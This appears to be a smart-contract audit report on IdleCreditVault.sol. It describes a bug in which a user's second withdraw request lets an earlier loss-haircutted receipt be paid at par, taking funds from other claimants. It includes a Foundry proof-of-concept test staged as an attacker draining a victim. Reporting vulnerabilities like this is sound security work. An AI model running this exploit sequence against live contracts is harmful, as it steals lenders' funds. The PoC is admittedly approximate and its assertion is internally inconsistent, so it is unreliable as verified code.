### Title
Loss-adjusted withdraw receipt is paid at par after a second `requestWithdraw` overwrites `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The external bug class — skipping zero-valued entries so a safety check passes vacuously — has a direct analog in `IdleCreditVault._claimLossAdjustedWithdrawRequest`. The loss-recovery price lookup is keyed only by `lastWithdrawRequest[_user]`, so when a user has a haircutted receipt from an earlier `stopEpochWithDuration` epoch and then files a new withdraw request, the lookup sees `lossRecoveryPriceByEpoch[newEpoch] == 0` and treats it as "no loss epoch" — the code silently skips the haircut and the old partially-funded receipt falls through to `_claimFundedWithdrawRequest`, which pays the aggregate `withdrawsRequests[_user]` at par. The unfunded loss portion is stolen from the strategy's funded pool belonging to other claimants.

### Finding Description
When `stopEpochWithDuration` under-funds pending receipts, `collectWithdrawFunds` records `lossRecoveryPriceByEpoch[epoch] = _amount * 1e18 / pendingBasis` and clears `pendingWithdraws` — meaning only `_amount` underlying was ever collected for that epoch's receipts (contracts/strategies/idle/IdleCreditVault.sol:411-420).

Later, `claimWithdrawRequest` routes through `_claimLossAdjustedWithdrawRequest` (lines 789-801):

```solidity
uint256 lossEpoch = lastWithdrawRequest[_user];
uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
if (lossRecoveryPrice == 0) return amount;
```

Only the *latest* request epoch is checked. `requestWithdraw` overwrites `lastWithdrawRequest[_user] = currentEpoch` on every call (line 282), and the CDO layer explicitly allows stacking requests — the comment at line 323 states a user who "requests another withdraw... will have to wait for another epoch to claim both requests." There is no per-epoch iteration and no check that older epochs' receipts carry a haircut.

Then `_claimFundedWithdrawRequest` (lines 319-330ff) gates only on `epochNumber <= lastWithdrawRequest[_user]` (skipped once the new epoch ends, or entirely when `epochEndDate() == 0` on a closed pool) and pays the full aggregate `withdrawsRequests[_user]` via `_transferFundedClaim` at par (line 906). The `defaultRecoveryReserve` guard in `_transferFundedClaim` does not help — it only protects the post-default reserve, not pre-default funded cash.

Broken invariant: one receipt one (correctly-priced) payout — a receipt funded at `lossRecoveryPrice < 1e18` is redeemed at `1e18`.

### Impact Explanation
Direct theft / insolvency. For each haircutted unit re-claimed at par, the strategy pays out `1 - lossRecoveryPrice` underlying it never received from the borrower. That cash belongs to other funded receipt holders; the theft either drains the strategy so later legitimate `claimWithdrawRequest`/`claimInstantWithdrawRequest` calls revert on transfer (permanent freezing of unclaimed claims), or, after default finalization, is absorbed into a smaller recovery for everyone. Loss is quantified as `claimBasis_epochN * (1e18 - lossRecoveryPriceByEpoch[N]) / 1e18` per exploit, repeatable across epochs.

### Likelihood Explanation
Requirements are all unprivileged and realistic:

1. Attacker is a KYC-passing lender holding tranche tokens.
2. `requestWithdraw` part of the balance in epoch N; honest manager calls `stopEpochWithDuration` with `_lossAmount > 0` → `collectWithdrawFunds` funds less than `pendingBasis` and stores `lossRecoveryPriceByEpoch[N] < 1e18` (a normal, honest partial-loss epoch — not a default).
3. Attacker calls `requestWithdraw` again in epoch N+1 (remaining tranche balance, or any deposited amount), overwriting `lastWithdrawRequest`.
4. After epoch N+1 stops (or immediately if the pool is closed, since the `epochEndDate() != 0` gate is skipped), `claimWithdrawRequest` pays both receipts at par.

No privileged misbehavior, no oracle manipulation, no timing race is needed — just two ordinary withdraw requests around one ordinary loss epoch.

### Recommendation
Track loss-adjusted receipts per epoch instead of keying on `lastWithdrawRequest`. Concretely:

- In `_claimLossAdjustedWithdrawRequest`, do not return early when `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]] == 0`. Either iterate the user's request epochs, or store a per-user flag/marker (e.g., `lossEpochByUser`) set at `collectWithdrawFunds` time for each epoch that received a haircut.
- Alternatively, when a `requestWithdraw` is filed while the user has an unclaimed receipt in an epoch with `lossRecoveryPriceByEpoch != 0`, force-clear/settle the old haircutted receipt first (or revert requiring a prior claim, mirroring the post-default "claim open receipt first" flow).
- As defense in depth, `_claimFundedWithdrawRequest` could subtract `lossRecoveryPriceByEpoch`-marked per-epoch basis from `withdrawsRequests[_user]` before paying at par.

### Proof of Concept
Foundry fork-style PoC against the existing `test/foundry/IdleCreditVault.t.sol` harness (uses its helpers `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`):

```solidity
function testLossAdjustedReceiptPaidAtParAfterSecondRequest() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    address attacker = makeAddr('loss-bypass-attacker');
    address victim   = makeAddr('victim');

    // Attacker and victim deposit into AA
    _depositWithUser(attacker, 20_000 * ONE_SCALE, true);
    _depositWithUser(victim,   20_000 * ONE_SCALE, true);

    // Epoch 0 runs; both file withdraw requests during buffer of epoch 1
    _startEpochAndCheckPrices(0);

    uint256 attackerTranche = IERC20Detailed(address(AAtranche)).balanceOf(attacker);
    vm.prank(attacker);
    uint256 attackerBasis = cdoEpoch.requestWithdraw(attackerTranche / 2, address(AAtranche));
    vm.prank(victim);
    cdoEpoch.requestWithdraw(IERC20Detailed(address(AAtranche)).balanceOf(victim), address(AAtranche));

    // Honest manager stops epoch 0 with a partial loss: only 60% of pending receipts funded
    uint256 pendingBasis = creditVault.pendingWithdraws();
    deal(defaultUnderlying, borrower, pendingBasis * 6 / 10);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, /* duration */ 30 days); // funds < pendingBasis

    uint256 lossPrice = creditVault.lossRecoveryPriceByEpoch(0);
    assertLt(lossPrice, 1e18, 'epoch 0 must be loss-adjusted');

    // Attacker files a SECOND request in epoch 1 -> lastWithdrawRequest overwritten
    _startEpochAndCheckPrices(1);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // remaining tranche balance

    // Epoch 1 ends normally and fully funds epoch-1 receipts
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // Claim: loss price lookup hits epoch 1 (== 0) -> skips haircut; funded path pays ALL at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    // Bug: epoch-0 receipt paid at par instead of at lossPrice
    uint256 epoch1Basis = creditVault.withdrawsRequestsByEpoch(attacker, 1); // captured pre-claim in practice
    assertApproxEqAbs(
        paid,
        attackerBasis /* + epoch1Basis */,
        5,
        'haircutted epoch-0 receipt was paid at par'
    );
    // Expected correct payout for the epoch-0 piece was attackerBasis * lossPrice / 1e18.
    // The difference (attackerBasis * (1e18 - lossPrice) / 1e18) is drained from victim's funded claim.
}
```

Note: the exact helper names for `stopEpochWithDuration` and the pre-claim capture of `epoch1Basis` may need minor adjustment to match the test harness; the exploit sequence itself — two `requestWithdraw` calls bracketing a `stopEpochWithDuration` loss, then `claimWithdrawRequest` — only uses the public unprivileged flow and the honest manager path. The key assertion is that the attacker's payout exceeds `attackerBasis * lossPrice / 1e18 + epoch1Basis`, i.e., the epoch-0 haircut is never applied.
